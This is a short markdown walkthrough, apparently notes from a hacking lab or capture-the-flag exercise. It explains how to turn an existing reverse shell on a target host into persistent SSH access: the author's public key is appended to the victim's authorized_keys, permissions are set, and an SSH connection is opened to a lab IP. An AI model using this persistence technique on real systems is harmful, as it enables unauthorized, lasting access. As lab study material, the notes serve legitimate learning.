# SSH through keygen


---

## Step 1: On Your Local Machine 
Ensure your local private key file has the correct secure file permissions required by SSH.

1. **Set secure permissions** on your private key:
   ```bash
   chmod 600 ~/.ssh/target_key
   ```

---

## Step 2: Inside the Remote Reverse Shell
Run these commands within your active reverse shell connection to authorize your local key.

1. **Navigate** to the target user's home directory:
   ```bash
   cd ~
   ```

2. **Create the SSH configuration directory**:
   ```bash
   mkdir -p .ssh
   ```

3. **Append your public key** into the authorization file:
   ```bash
   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOw0EQ7SmaG5OL+DALtR4EPeF30jc1Y0x3p8Ycfa3z3oHCmjNTbadjxPJDMcKOEswV7GfN1HXxqWTEMxfKBGjFhWDpuIHGmZD0db7UZ6mrHWe3wVrOGzuaPA9gP716TbuLBgcK1R9mqv1LPgPvyqYnrUI3lI43rLC61H8rEJ5ox+ynRAj3hLthtDVWjijQOnULLrTFAxM81vvcmwCCCPDF2EpExSnrhFAF75AaIg9e3vJ7jGRqr76TKj6bESFi0bpb4r1/SuzIUVml14vXSucDf/ChwAA4FMaka522zeuoRVB4Q3Veom+kpcnVYAzcn9LDOfPokxA+6Ulk9fWFk+nVAVYKMMdnX4LQ9FAi9sfyyc89JC0PpfyXJm+/yMM2kqqbJXQA4BGZTetpsMJNG+ITN2sgYSzH1m548hXXjo/nRK8QmEPoyA6gsy3qT7AcLxp1h550TwmfXorwzRMjyhqxxsP6tjyJ3cBg8DT712tnZQJIn5EzmVtvNDSFrPwXTidv/NxWJ8NJOWy4Q9iJ20cQrxrESEvdJ+6A+vQdWItfttbWlRtj5Eu/cAhuwewntFjguX73AMOwzCZ43xDCrYCJE16k1lHeG/BHOQ2tfICxlqXyTPt98RYSUAZNLebaqDoqQDSBDzd4WTXUx5qwE1CFRwU9pHohHNSzWVPOKYkloQ== abhiram@abhiram-VirtualBox" >> .ssh/authorized_keys
   ```

4. **Lock down remote permissions** (SSH will ignore the file if it is publicly readable):
   ```bash
   chmod 700 .ssh
   chmod 600 .ssh/authorized_keys
   ```

---

## Step 3: Connect From Your Local Machine (Your VirtualBox)
Open a new, local terminal window on your machine and execute the corrected connection command. 

*Note: Replace `username` with the actual username of the target account (run `whoami` in the reverse shell if you are unsure).*

```bash
ssh -i ~/.ssh/target_key username@10.129.59.198
```
